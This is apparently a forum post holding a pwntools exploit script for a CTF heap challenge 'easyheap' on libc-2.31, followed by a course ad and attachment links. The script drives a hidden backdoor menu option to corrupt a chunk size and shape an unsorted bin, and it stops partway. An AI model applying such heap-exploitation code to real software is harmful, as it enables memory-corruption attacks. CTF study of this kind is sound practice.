
```python
from pwn import *
p = process('./easyheap')
libc = ELF('./libc-2.31.so')
context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'
heap = 0x4060
backdoor_time = 0x4014
offset = -10  # but 8 bytes
#gdb.attach(p)
def madd(size,content,offset=0):
    payload = b'1\x00\x00\x00' + p32(0xffffffff - 9) * 3
    p.sendafter('4.delete\n',payload)
    p.sendlineafter('Size?\n',str(size))
    p.sendlineafter('Context:\n',content)
def edit(idx,content):
    payload = b'2\x00\x00\x00' + p32(0xffffffff - 9) * 3
    p.sendafter('4.delete\n',payload)
    p.sendlineafter('Idx?\n',str(idx))
    p.sendlineafter('Context:\n',content)
def back(size,off,content):
    payload = b'666\x00\x00\x00\x00\x00' + p32(0xffffffff - 9) * 2
    p.sendafter('4.delete\n',payload)
    p.sendlineafter('Size?\n',str(size))
    p.sendafter('?\n',str(off))
    p.sendline(content)
#b *$rebase(0x1405)
def pwn():
    for i in range(8):
        madd(0x200,b'aaaa')
    madd(0x200,b'aaaa')
    back(0x250,0x258,p64(0xb71))
    madd(0xc00,b'') #unsorted bin
```

[[招生]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)

上传的附件：

- [0dac8488515a486da852fa81979164c7.zip](javascript:void(0);)
  （845.70kb，18次下载）
- [530a9902b0574ae8aebd077c5987e142.zip](javascript:void(0);)
  （984.41kb，16次下载）
- [b174bccab1d94c4aaa4f868e84abc670.zip](javascript:void(0);)
  （341.83kb，18次下载）
